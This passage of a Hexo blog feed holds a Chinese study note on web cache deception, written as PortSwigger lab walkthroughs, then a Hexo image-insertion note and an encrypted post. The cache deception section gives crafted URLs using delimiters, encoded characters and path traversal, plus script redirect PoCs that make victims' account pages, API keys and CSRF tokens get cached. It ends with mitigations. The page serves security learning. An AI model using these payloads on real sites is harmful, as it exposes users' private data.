cache deception）"></a><strong>Web缓存欺骗</strong>  （Web cache deception）</h1><p>首先简单了解或复习一下web缓存相关的知识；</p><p><img src="/2025/10/15/web-cache/image-20251015211539056.png"></p><p>Web缓存是位于源服务器和用户之间的系统。当客户端（用户）请求静态资源时，首先会先去看看cache里面有没有，若没有（缓存cache未命中），再去找源服务器要，服务器响应在发送给用户之前也先发送到该高速缓存，有cache自己的配置规则觉得存不存。</p><p>现在CDN（内容交付网络）广泛使用，就是在服务范围各地放上一组服务器，里面存档缓存（边缘edge节点）</p><h2 id="缓存键（Cache-key）"><a href="#缓存键（Cache-key）" class="headerlink" title="缓存键（Cache key）"></a>缓存键（Cache key）</h2><p>是缓存系统（如 CDN、代理服务器）用来判断：</p><blockquote><p>“两个请求是不是要同一个资源” 的“唯一标识符”。</p><p>Cache key 唯一标识一份缓存的内容。用于判断命中🎯</p></blockquote><p>cache key从Http请求的元素中生成，比如Host，Path元素</p><h2 id="缓存规则（Cache-rules）"><a href="#缓存规则（Cache-rules）" class="headerlink" title="缓存规则（Cache rules）"></a>缓存规则（Cache rules）</h2><p>Cache rules<strong>决定哪些响应可以被缓存、按什么条件缓存、以及缓存多久</strong>。通常用来把不常变且可重复使用的<strong>静态资源</strong>缓存到 CDN&#x2F;边缘节点或反向代理上，从而提高性能并减轻源站压力。</p><p>缓存欺骗攻击就是利用各种规则，举几个规则的例子：</p><p><strong>按文件扩展名（Static file extension）</strong></p><ul><li>规则形式：匹配 URL 后缀（<code>.css</code>, <code>.js</code>, <code>.png</code>, <code>.jpg</code>, <code>.woff2</code> 等）。</li><li>示例：<code>if url endswith .css or .js =&gt; cache public, max-age=7d</code></li></ul><p><strong>按目录前缀（Static directory）</strong></p><ul><li>规则形式：匹配以某前缀开头的路径（<code>/static/</code>, <code>/assets/</code>, <code>/images/</code>）。</li><li>示例：<code>/static/* =&gt; cache public, max-age=30d</code></li></ul><p><strong>按文件名（File name）</strong></p><ul><li>规则形式：匹配特定文件名（<code>robots.txt</code>, <code>favicon.ico</code>, <code>sitemap.xml</code>）。</li><li>示例：<code>/favicon.ico =&gt; cache public, max-age=30d</code></li></ul><p><strong>按 Query 参数 或 参数白名单</strong></p><ul><li>规则形式：只缓存不带&#x2F;带特定 query 的请求；或忽略某些参数。</li><li>示例：<code>cache key = path + allowed_query(q, v)</code> 或 <code>ignore utm_* parameters</code></li></ul><p><strong>按请求头或方法</strong></p><ul><li>例如只缓存 <code>GET</code>，或根据 <code>Accept-Encoding</code>&#x2F;<code>Accept-Language</code> 分化缓存（用 <code>Vary</code>）。</li></ul><p><strong>动态&#x2F;自定义规则</strong></p><ul><li>例如基于内容分析、响应头（有无 <code>Set-Cookie</code>）、User-Agent 等进行判断。</li></ul><h2 id="策动Web缓存欺骗攻击"><a href="#策动Web缓存欺骗攻击" class="headerlink" title="策动Web缓存欺骗攻击"></a><strong>策动Web缓存欺骗攻击</strong></h2><p>通常分为3步</p><ol><li><p>找到返回<strong>动态敏感内容</strong>的端点（优先 GET&#x2F;HEAD&#x2F;OPTIONS）。</p></li><li><p>确定该Cache和源服务器解析URL路径的方式存在差异。这可能是它们在以下方面存在差异：</p><ul><li>将URL映射到资源。</li><li>处理字符串。</li><li>规范化路径。</li></ul></li><li><p>利用差异构造一个看起来“静态”的 URL（通常加入静态扩展名或路径），诱导受害者发起请求（浏览器会带上 Cookie）。</p><p>缓存层将受害者的响应缓存下来（如果被缓存）。</p><p>攻击者向相同 URL 请求（不带 Cookie）以读取缓存响应。</p></li></ol><p>这里简单解释一下</p><details>  <summary><b>📘 点击展开解释</b></summary><ul><li><ol><li>目标敏感页面：GET &#x2F;dashboard（受登录用户可见，返回用户私人 HTML，没有 Cache-Control: no-store）</li></ol></li><li><ol start="2"><li>攻击者构造恶意 URL：&#x2F;dashboard.png（或 &#x2F;dashboard&#x2F;avatar.png）</li></ol></li><li><ol start="3"><li>诱导受害者访问 <a href="https://target.example.com/dashboard.png%EF%BC%88%E5%8F%97%E5%AE%B3%E8%80%85%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E5%B8%A6">https://target.example.com/dashboard.png（受害者浏览器会带</a> Cookie）</li></ol><p>​           源站仍返回用户的 Dashboard HTML（应用忽略了 .png 后缀）</p><p>​           CDN&#x2F;缓存层看到 URL 带 .png，规则认为可以缓存，以 Host+path 为 key 把响应缓存起来</p></li><li><ol start="3"><li>攻击者访问 <a href="https://target.example.com/dashboard.png%EF%BC%88%E4%B8%8D%E5%B8%A6">https://target.example.com/dashboard.png（不带</a> Cookie）</li></ol><p>缓存层命中并返回缓存的私人 HTML → 攻击者得到受害者数据</p></li></ul></details><p>(验证cache时有两个注意点1.要有cache buster 每次测试写读都要用独一无二的key，防止不期望的命中干扰 2. 看时间，有cache肯定时间会比第一次没有cache更快，看标头，有些会包含cache状态)</p><h2 id="利用静态扩展缓存规则攻击（看后缀-css）"><a href="#利用静态扩展缓存规则攻击（看后缀-css）" class="headerlink" title="利用静态扩展缓存规则攻击（看后缀 css）"></a><strong>利用静态扩展缓存规则攻击</strong>（看后缀 css）</h2><h3 id="利用路径映射差异"><a href="#利用路径映射差异" class="headerlink" title="利用路径映射差异"></a>利用路径映射差异</h3><p>比如这个地址：<code>http://example.com/user/123/profile/wcd.css</code></p><ol><li><p>源服务器理解为 REST风格  对<code>/user/123/profile</code>端点的请求，返回123用户的敏感信息，忽略不重要的参数wcd.css</p></li><li><p>Cache理解为 传统url user&#x2F;123&#x2F;profile目录下的wcd.css； 它的规则就是把.css后缀文件当做静态存储</p></li></ol><h4 id="LAB：利用路径映射进行Web缓存欺骗"><a href="#LAB：利用路径映射进行Web缓存欺骗" class="headerlink" title="LAB：利用路径映射进行Web缓存欺骗"></a><strong>LAB：利用路径映射进行Web缓存欺骗</strong></h4><p><img src="/2025/10/15/web-cache/image-20251015234129919.png"></p><p>​    （还介绍了一个插件<a href="https://portswigger.net/bappstore/bapps/download/7c1ca94a61474d9e897d307c858d52f0/3"> Web Cache Deception Scanner</a>用于自动扫描web缓存欺骗）</p><p>首先经过简单的辨别 确认了可调试的点在账户界面 这里会回显我们想要的API密钥</p><p>先常规访问&#x2F;my-account<img src="/2025/10/15/web-cache/image-20251016000254023.png"></p><p>再加入无用参数路径 test <img src="/2025/10/15/web-cache/image-20251016000355441.png"> 依旧是成功200访问</p><p>！！<strong>得到结论 源服务器会滤过无用的参数</strong></p><p>测试Cache ，访问test.css 加上一个常见的静态文件后缀<img src="/2025/10/15/web-cache/image-20251016000547487.png"></p><p>在相应标头中 看到关键字段 Cache-Control: max-age&#x3D;30   ；  Age: 0 ；  X-Cache: miss</p><p>再访问一次，明显快多了，就是命中缓存了  标头也发生了期望的变化<img src="/2025/10/15/web-cache/image-20251016000731656.png"></p><p>！！ <strong>得到结论 Cache是对一些静态文件进行存储</strong></p><p>那就给受害者发去包含后缀的跳转链接 我再访问获取他的缓存即可</p><p><img src="/2025/10/15/web-cache/image-20251016000936119.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://Lab-URL/my-account/yjh.css&quot;</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>在时限内访问yjh.css 可以看到命中了carlos留下的缓存，拿到key</p><p><img src="/2025/10/15/web-cache/image-20251016001023315.png"><img src="/2025/10/15/web-cache/image-20251016001044549.png"></p><h3 id="分隔符差异"><a href="#分隔符差异" class="headerlink" title="分隔符差异"></a><strong>分隔符差异</strong></h3><p>分隔符用于指定URL中不同元素的边界，利用源服务器和cache服务器对分隔符的使用不一致，进行 写缓存，读缓存 来构造欺骗 </p><p>1.例如：&#x2F;profile;foo.css</p><p>Java Spring框架使用<code>;</code>来添加参数 会把<code>;</code>后面的截断，</p><p>而不使用Java Spring的缓存可能会将<code>;</code>及其之后的所有内容解释为路径的一部分。</p><p>2.再或者 Ruby on Rails中的format机制</p><p><code>/profile</code> → HTML（用户资料）</p><p><code>/profile.css</code> → Rails 认为 <code>.css</code> 是 format 请求，但没有 CSS formatter → 可能报错或返回 406</p><p><code>/profile.ico</code> → <code>.ico</code> 未被识别，Rails 可能把请求交给默认 HTML formatter（降级使用） → 返回用户资料<br> 若缓存配置认为 <code>.ico</code> 可缓存 → 私人资料被缓存并披露</p><p>  所以最后做一个总结 就是找一个源服务器把 <strong>某字符当作分隔符截断路径</strong>、而<strong>缓存层不把它当分隔符并把整条路径（含静态扩展名）用于缓存</strong>的字符。</p><p>构造&#x2F;path<delimiter>garbage.<ext></ext></delimiter></p><p>这里提供一个表：<a href="https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list">Web缓存欺骗分隔符列表</a></p><h4 id="LAB：利用路径分隔符进行Web缓存欺骗"><a href="#LAB：利用路径分隔符进行Web缓存欺骗" class="headerlink" title="LAB：利用路径分隔符进行Web缓存欺骗"></a><strong>LAB：利用路径分隔符进行Web缓存欺骗</strong></h4><p><img src="/2025/10/15/web-cache/image-20251018172441249.png"></p><p>首先登录已有账号，</p><p><img src="/2025/10/15/web-cache/image-20251018172657498.png"></p><p>经过几次发送能确定的是，这就是我们要欺骗的点，且不能直接用路径欺骗，随后尝试加上<code>;</code>作为分割符访问，发现能源站可以访问</p><p><img src="/2025/10/15/web-cache/image-20251018172903954.png"></p><p>这里我是直接试到了可用分隔符，常规一点就要先爆破，这里也简单展示一下，导入分隔符，把默认的url编码关掉，下面一张图展示所有信息：</p><p><img src="/2025/10/15/web-cache/image-20251018174626900.png"></p><p>随后用这两个可能符号再去测试Cache的服务器的回显即可</p><p>随后尝试写cache 连续发送两次<img src="/2025/10/15/web-cache/image-20251018172952336.png">，发现缓存命中 说明源站和cache的解析有差异</p><p>后面又经过自己的测试 最后直接构造攻击网址并发送即可；</p><p><img src="/2025/10/15/web-cache/image-20251018174124213.png"></p><p>在短时间内访问<img src="/2025/10/15/web-cache/image-20251018174141394.png"> 获得受害者写入的缓存<img src="/2025/10/15/web-cache/image-20251018174221191.png"></p><h3 id="定界符解码差异"><a href="#定界符解码差异" class="headerlink" title="定界符解码差异"></a><strong>定界符解码差异</strong></h3><p>这其实也可以归为一种分隔符的解析差异，</p><p>原因是不同软件&#x2F;层的 URL 处理顺序不同：</p><ul><li><strong>先解码再匹配</strong>（一些应用服务器&#x2F;框架）：会把 <code>%xx</code> 换回字符再根据分隔符规则处理路径。</li><li><strong>先用编码形式匹配规则再解码&#x2F;转发</strong>（一些 CDN&#x2F;缓存&#x2F;代理）：会基于编码后的原始字面串决定是否缓存或应用规则，然后再解码并回源。</li></ul><p>举两个例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/profile%23wcd.css<br></code></pre></td></tr></table></figure><ul><li><code>%23</code> 是 <code>#</code>（fragment&#x2F;hash）的编码。</li><li>源站：先对 <code>%23</code> 解码为 <code>#</code>，<code>#</code> 被视为分隔符 → 源站只看到 <code>/profile</code> → 返回用户资料（动态内容）。</li><li>缓存：不解码 <code>%23</code> 就判断扩展名，看到 <code>.css</code> → 认为可缓存 → 把响应以 <code>/profile%23wcd.css</code> 为 key 缓存。</li><li>结果：缓存中保存了私人 profile 内容，攻击者请求同一编码 URL 可读到缓存内容。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/myaccount%3fwcd.css<br></code></pre></td></tr></table></figure><ul><li><code>%3f</code> 是 <code>?</code>（query separator）。</li><li>某些缓存会先<strong>基于编码 URL</strong>决定缓存（看 <code>.css</code>），然后再<strong>解码</strong>并转发给源站（得到 <code>/myaccount?wcd.css</code>），源站以 <code>?</code> 为界 → 实际视为 <code>/myaccount</code> → 返回私人内容 → 缓存已经保存了该响应（因之前认定为 <code>.css</code>）。</li><li>关键点：缓存判断使用了“编码前”的字符串而源站处理的是“解码后”的字符串。</li></ul><h2 id="利用静态目录缓存规则-看目录-static"><a href="#利用静态目录缓存规则-看目录-static" class="headerlink" title="利用静态目录缓存规则(看目录 static)"></a><strong>利用静态目录缓存规则</strong>(看目录 static)</h2><p>直接举例（最常见）：</p><p>攻击者利用标准化差异构造：<code>/static/..%2Fprofile</code></p><ul><li><p>如果 <strong>源站</strong> 会把 <code>%2F</code> 解码为 <code>/</code> 并解析 <code>..</code>，最终变成 <code>/profile</code>（返回私人资料）。</p></li><li><p>如果 <strong>缓存</strong> 没有解码 <code>%2F</code> 或不解析 <code>..</code>，它会认为路径以 <code>/static/</code> 开头（符合静态文件缓存规则），并把返回的私人资料缓存为 <code>/static/..%2Fprofile</code>。</p><p>测试源站漏洞时，多尝试符号，（要注意有些Cache匹配静态目录的斜杠，所以这个可以先不考虑)</p><p>测试Cache时，过滤出2xx 响应 和 script, images, CSS MIME 静态资源类型，可以在选择一个带有缓存响应的请求，静态文件上测试&#x2F;aaa&#x2F;..%2fassets&#x2F;js&#x2F;stockCheck.js，也可以在后面&#x2F;assets&#x2F;..%2fjs&#x2F;stockCheck.js</p></li></ul><p>这样根据结果完全可以判断出二者对路径遍历的标准归一化处理</p><h3 id="利用源服务器的规范化："><a href="#利用源服务器的规范化：" class="headerlink" title="利用源服务器的规范化："></a><strong>利用源服务器的规范化：</strong></h3><h4 id="LAB：利用源服务器规范化进行Web缓存欺骗"><a href="#LAB：利用源服务器规范化进行Web缓存欺骗" class="headerlink" title="LAB：利用源服务器规范化进行Web缓存欺骗"></a><strong>LAB：利用源服务器规范化进行Web缓存欺骗</strong></h4><p><img src="/2025/10/15/web-cache/image-20251018214946891.png"></p><p>首先找到原本带有缓存机制的文件<img src="/2025/10/15/web-cache/image-20251018215553303.png"></p><p>我在my-account界面已经确定了源服务器会对<code>.</code>和<code>/</code>都进行规范化处理（能访问）</p><p>那就看看这个静态文件目录上，我先以为image是静态目录文件，导致一直没效果，后面确定resource是文件，讲讲测试过程，</p><ol><li>在resource前进行路径遍历编码测试<code> /aa/..%2fresources/images/avatarDefault.svg</code></li></ol><p>结果发现直接不符合Cache保存机制了，没有cache的文件头了，说明没解析编码 Cache以为没有这个文件夹</p><p><img src="/2025/10/15/web-cache/image-20251018220311339.png"></p><ol start="2"><li>在resource后面进行测试，要是会解析，就会直接把resource遍历掉，实则没有，说明不会解析</li></ol><p><img src="/2025/10/15/web-cache/image-20251018220548521.png"></p><p>  那利用的思路就是让源站通过<code>路径遍历访问敏感文件，但路径中要有静态文件名字</code></p><p><img src="/2025/10/15/web-cache/image-20251018221010486.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://0aca000b037f90bf81b4398500d400ae.web-security-academy.net/resources/..%2fmy-account&quot;</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(这里提醒一下，也是我碰到的小插曲，在自己测试失败时，有可能你自己留下了缓存，这时候你就要想办法构造新的URL，保证受害者来写缓存)</p><p><img src="/2025/10/15/web-cache/image-20251018221730129.png"></p><h3 id="利用该高速缓存服务器的规范化："><a href="#利用该高速缓存服务器的规范化：" class="headerlink" title="利用该高速缓存服务器的规范化："></a><strong>利用该高速缓存服务器的规范化：</strong></h3><h4 id="LAB：利用缓存服务器规范化进行Web缓存欺骗"><a href="#LAB：利用缓存服务器规范化进行Web缓存欺骗" class="headerlink" title="LAB：利用缓存服务器规范化进行Web缓存欺骗"></a><strong>LAB：利用缓存服务器规范化进行Web缓存欺骗</strong></h4><p><img src="/2025/10/15/web-cache/image-20251018222513639.png"></p><p>这个实验我走一遍全流程</p><p>首先测试拓展规则：</p><p><img src="/2025/10/15/web-cache/image-20251018222838992.png"><img src="/2025/10/15/web-cache/image-20251018223107480.png">结果就是不靠后缀判断是否cache</p><p>随后测试文件目录规则：</p><p>源服务端不识别编码，因为这里我想遍历却失败<img src="/2025/10/15/web-cache/image-20251018223407299.png">!</p><p>但Cache会编码，因为这里编码后本会遍历<img src="/2025/10/15/web-cache/image-20251018223534760.png"></p><p>然后尝试构造，目标是能成功返回信息，且有缓存的URL，那就是算上前面测试的合法分隔符<code>#</code></p><p><img src="/2025/10/15/web-cache/image-20251018224850828.png"></p><p>最后我一直用#不成功但%23就行了  ，可能是因为直接用#或者？服务器会当初锚点和参数隔离 但编码的形式就只是隔离作用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">poc</span>:<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://net/my-account%23/..%2fresources/a&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>(后面加个&#x2F;a是我为了每次都是新url，防止我的缓存覆盖，要让受害者作为第一次写入)<img src="/2025/10/15/web-cache/image-20251018230052675.png"></p><h2 id="利用文件名缓存规则"><a href="#利用文件名缓存规则" class="headerlink" title="利用文件名缓存规则"></a><strong>利用文件名缓存规则</strong></h2><p>某些文件（如<code>robots.txt</code>、<code>index.html</code>和<code>favicon.ico</code>）是Web服务器上常见的文件。它们经常被缓存，因为它们很少更改。缓存规则通过匹配确切的文件名字符串来定位这些文件。</p><h2 id="LAB：利用精确匹配缓存规则进行Web缓存欺骗"><a href="#LAB：利用精确匹配缓存规则进行Web缓存欺骗" class="headerlink" title="LAB：利用精确匹配缓存规则进行Web缓存欺骗"></a><strong>LAB：利用精确匹配缓存规则进行Web缓存欺骗</strong></h2><p><img src="/2025/10/15/web-cache/image-20251018230241552.png"></p><p>这个实验的解法可能是欺骗得到admin用户的缓存 拿到cookie session伪造登录admin</p><ol><li>首先看看能不能直接文件后缀<img src="/2025/10/15/web-cache/image-20251018231119025.png">，其实一般都是失败</li><li>跑一下字典看看有没有分隔符能用</li></ol><p><img src="/2025/10/15/web-cache/image-20251018231322861.png"></p><p>我们在第一步证明了规则和后缀无关，所以不用尝试分隔符差异</p><ol start="3"><li>再判断标准归一化和通过目录规则导致的cache欺骗</li></ol><p><img src="/2025/10/15/web-cache/image-20251018231605947.png">首先就发现直接就不让路径遍历，那也就不追求从这里突破了，因为连服务器都得不到正常回显我们还骗啥啊</p><ol start="4"><li>最后就是文件名缓存</li></ol><p>尝试访问robots.txt，有Cache机制<img src="/2025/10/15/web-cache/image-20251018231822840.png"></p><p>加上路径遍历<img src="/2025/10/15/web-cache/image-20251018232848128.png">很理想，就是服务器无法解析，但是cache能解析遍历，这步就是获得cache的规则</p><p>那最后就是想办法让源服务器成功回显，测试中发现服务器 碰到&#x2F;就404 但是一编码就没事，说明服务器不编码，是吧编码的当做普通字符</p><p><img src="/2025/10/15/web-cache/image-20251018233632738.png"></p><p>payload就出来了<img src="/2025/10/15/web-cache/image-20251018233649786.png"></p><p><img src="/2025/10/15/web-cache/image-20251018234110594.png"></p><p>最后<code>?a</code>也是为了让受害者第一次写入缓存，但是好像拿不到admin的cookie，但找到了csrf token</p><p><img src="/2025/10/15/web-cache/image-20251018234646782.png"></p><p>替换我们的csrf 并成功poc<img src="/2025/10/15/web-cache/image-20251018234916760.png"></p><p>发送攻击包 完成实验</p><h2 id="预防web缓存欺骗："><a href="#预防web缓存欺骗：" class="headerlink" title="预防web缓存欺骗："></a>预防web缓存欺骗：</h2><ul><li>始终使用<code>Cache-Control</code>头来标记动态资源，使用指令<code>no-store</code>和<code>private</code>设置。</li><li>配置您的CDN设置，以便您的缓存规则不会覆盖<code>Cache-Control</code>头。</li><li>激活您的CDN针对Web缓存欺骗攻击的任何保护。许多CDN允许您设置缓存规则，以验证响应<code>Content-Type</code>是否匹配请求的URL文件扩展名。比如云耀的缓存欺骗装甲。</li><li>验证源服务器和该高速缓存解释URL路径的方式之间没有任何差异。</li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全专题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo图片插入</title>
    <link href="/2025/10/13/test/"/>
    <url>/2025/10/13/test/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章 </p><p>记录基于hexo的博客图片插入问题 下面三张是最后成功的案例 </p><p><img src="/2025/10/13/test/test.png" alt="图片引用方法一"> </p><p><img src="/2025/10/13/test/test.png" alt="图片引用方法二"> </p><p><img src="/images/test.png" alt="图片引用方法三"></p><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><p>直接写图片名<mark>(test.png)</mark></p><h3 id="第二种（我目前倾向用）"><a href="#第二种（我目前倾向用）" class="headerlink" title="第二种（我目前倾向用）"></a>第二种（我目前倾向用）</h3><p>在下载了<strong>hexo-asset-image</strong>插件后，用</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> <span class="hljs-built_in">post</span> test<br></code></pre></td></tr></table></figure><p>生成markdown文件是会同时生成同名文件夹，然后把图片复制进去，md中引用名称<mark><strong>(test&#x2F;test.png)</strong></mark>即可</p><p>！ 我的typora是复制图片直接生成 .assert 目录的在每次最后我把assert后缀删掉就能自动合并</p><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>坏处是所有图片都在一个文件夹</p><p>在_post同目录下直接新建images目录 用于存放图片</p><p><img src="/2025/10/13/test/image-20251013214642522.png" alt="目录"></p><p>当图片在内时，直接调用<mark><strong>(&#x2F;images&#x2F;test.png)</strong></mark></p><h3 id="trouble"><a href="#trouble" class="headerlink" title="trouble"></a>trouble</h3><p>最后讲一下耗费我机会一天才解决的问题，图片引用问题。当时只有第三种成功了；前两种一直配置不好 </p><p><img src="/2025/10/13/test/image-20251013215837753.png" alt="错误拼接"></p><p>很多教程都没讲 后面看到一篇文章指出 问题出在 <code>项目根目录/node_modules/hexo-asset-image/index.js</code>的23行左右</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span>(<span class="hljs-regexp">/.*\/index\.html$/</span>.<span class="hljs-title function_">test</span>(link)) &#123;<br>  <span class="hljs-comment">// when permalink is end with index.html, for example 2019/02/20/xxtitle/index.html</span><br>  <span class="hljs-comment">// image in xxtitle/ will go to xxtitle/index/</span><br>  appendLink = <span class="hljs-string">&#x27;index/&#x27;</span>;<br>  <span class="hljs-keyword">var</span> endPos = link.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">var</span> endPos = link.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现 这个走了 else 分支导致的，我们把 <code>link.lastIndexOf(&#39;.&#39;)</code> 修改为 <code>link.lastIndexOf(&#39;/&#39;)</code> 即可 </p><p>**参考文章：<a href="https://blog.asroads.com/post/95d84581.html">Hexo生成博文插入图片</a></p>]]></content>
    
    
    <categories>
      
      <category>杂记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hgame_2025.9</title>
    <link href="/2025/10/12/mini-hgame-25/"/>
    <url>/2025/10/12/mini-hgame-25/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9749e053db319c5e4608b526ffd9a1c14be9b457e030544cd6e4ea423987b35e">1bc6829418f46f8ad9868f26d60b5149d073fd03d7013c3f4de26e66d30545b4dbac97414bd7968eaaa8203ebc4c70ac17410c14f6df4a1a421c85de47cdf65034c64d677e18a65d5c21c88eec94261b2e6b857eb76492166c698f1045e8e747e8088d41524f9448d248092c19d8cd78757ac2a26d3eab55c0c1a22c72e46578a7a6cba08f7913a7a6af41769259ef27b2b33529cc9b78dacb206f6434bd4064516eb64474789e5f3fe51229184740fc2a76202cbfcd024efa9961c2d2d185e7cac62488f903b5940901b63acc496dabae9af0831c36ad7f5c65d8fdc8787ed2ec97584dd5c2c079a2086b09952713570e2b316fc97822f7832671ad3aac22fb995a11d9ba28ec7762767ebb1cbb7d5e4b41948d2db3b720d397e191e2404338d4f313614320c4f9b8196271d9a2bbb6e49bf3da554132704c41382c9178c86c9d8100d4f841cb15ea8050e53641791b306ed441ec42f961384622db9bedca397134fbd030e638fba6ce58a7395ebd65c0cf8598ee570dfb1f8beb0be00422ae4ed0b48f2d8e64eca7adbaf8b05beb5e4c7b9e9d96711f5357f5891d1d7aaf0f3b00915d2c81a9cf28e0496621945efe4d77c5f3c8d883a63579bba97255fb8b5dfaa1c9a1fbd7e8e9ec85cd109c9fd4c03f4b585fae3cdb6669824ae50d5394519801bfe430287750708f14c4e0458de6eb53c888c422395e8726840d575d453c9ae7ff3bc2bc9dd3817c481324322bbb64744a8437a06d0c5d0c3360d803ce52dc1ef87cf4a298cb66d01cee08c2b142dbdd382b9d9f0933350616141b1553392a395a680d2c9af7ae0b87132502d00f2607188e396b03a40fc637aae8a096842abb76b92356b89b089a1564d08a29fa3fc7da2a3435a771dfa8155424f03fea455bc4bf120b08307e0e8c364d1a635e0ec4a02cdd80fce438dee7412d82cf8c8c69f17f4d6f710916a59f543723a3d00d3dab879761c513f5d25c59bd48bb8f8ce9ebc30aaaa8c3e81b9b6129f538c4083bde98a2dcb45c9ab80281a1b5fd3e44451efdf985dad0341702303d33d1ee6df5b68a8175a13b60a6ff53f6ba014d41f64f8f4bdbdaf467f7fb00ef9e9d88d7ce5110c79b833eaa00f5d21e7277522ff53602250eca028ef3bd5b5760e8958e62c379a2908050081ea6f4162c669013e3bad12d9fbc440fba3a5687b255b31df6db8a1f66b24fa4fe66c667073312c3d44dab7e9973f7f5c294fce4ec92e873bef0c36850ec3fab8d8538e0972308512467ff59f28a274ec15843938d1329e1dd286e234549b4824f5763b750e097349f5e1ba3ca90a355243f694b5cc8833410fa0b6f56cc89f88c12453a09e433071becc1040a39e61d475db7f9d2c373396622f39ecfce590ff4b9476d856188938dab31168e6f5e77915ef1641e86d442042d725233857f316f0c5057b244e2747dcd2becd10ee9c7c62e23db794553ecc35d46566df8f336fbc836f81d7aceaa4740aa8bb1cd4aa2fa33c2ff26b95e490f27c64be24d784e596c5304e27d386fa8ca49a44918d29e7ccecb3d90396ed6bde288aff32bcd95c2edd90c02ce93b82c02fa626007ec019b75c369c6e04689d080d9e3b1722d45348eef21857c927c194e34a0d077e2b4dd33597593002718fe94be19ac02cdf7a7cbd0027b219a26291530de7e5760fc8dbe1d2735c4598b5d95e0dd8caa4cec86ec8c0486bab7d9372d8dbe33d9ce825883e0294c7659384ce91fa87f934b899a2b6cd1c306521142359c07362bac69ae934bad434a73196bd8acf75de7f9af8dfa66b79e6298a14859037c81bb2ae05762ca421b710d705185572b67dcf1f1145b6c4f499bfe282f8bef4a41507bb91560d2960a27f0bf5bdfc8ffb52867aa1cfd08bb800ac2fa1a3a40beff04cdfbf88895d54375d218d1c2e014bc3d595dd0cb1313d7c2d186adea87855b6ca2fdde523eb35ad6b3ef24d7578d71d20913bcbf90afc96ee37c5bf8a6a8e2d626f005e105f3b24900676d612bd9aeb32b594a6521a9f5808651b99168f4d979fd954a1b274d2377750612acc998ff21c00504a741b05de84031c3672028541c40df1d84d62b6e9f8874a6f5cf45d697c3cf597ae9a2f8acdd8017509fbff9478660a46aa430c79f493954fe436c543c5e04131f8e19837f13e629173ba37f45bbf15de4008c8b2d7a6d3cdb74688aa014f9e3348b4633c073dd677b9b00edff1d46a1b91c7c3578fa8f337960fdabbdffd68677fce00999da925a01d1685492fd4c208d7d2e80a7d822d20a729ed82cb29954c0173904ce04da234bf6c6a998b78eac352869aa90c1fa370a5f2813eefa75e215b2156b4c36642b5b4174d1fa26d5e54bde35635742eda6e4ebc2acfd1c1041eb88acfb3bc56c1e8e259cd6b16948e74eb5c972dc5affc6d9bbae34478cb80ad757e1e7492975d296c4c4a4c1b6d6cb0ffd0805151cff9c37c028640bcb28a8cef3bb9a92d66f4e0e6809abeafa3e242ded724c9e9a075cb650c97f67fb35a907ef8e1d5b901e71e3f538901f9a281cc69ae97e40d29c11bd4cf46e6814fdbec2d0313e35b95cedb9c898aab3d61561683162c94574a140b399116f1f012559bcd67d750e11444568892226ef5f4251bcea450a843b8c773ee4142c5d5f0b4e09a01817a9a103debf0ef8b817aa24ad8cfbd42cce7680c013360866beaccdfee7d88709db8b1084d50a7fe15a1ac2067270303a82108dee46484b03df69ca20f69867a49d45ad72527c03b312364eaad892d89b99ce451270fb9a96bbc99317471aca8fbf4c6968325a0df585c474494903eeb56acf0936bd2017a4ef16bb8beb017e19b8e26a775e675b203a08ec26af39cb89f47d1022c6837dc2818f4411b94ffb96856a837fb41eeb47460600fdf6106205abb8abc5e30b02111b62a093d1de4418c233bbad99abf4679ed8192af89ac5bd15f2546bdba9cef1ed628e9ec528779a637441444dd5c3f61a82834c26e0490db6f12424fe197be97e0bfa6ff05a2df8d188f4240af063cac6f3f5c0d2735db55017b8bb4b5403ef6d5e6d62c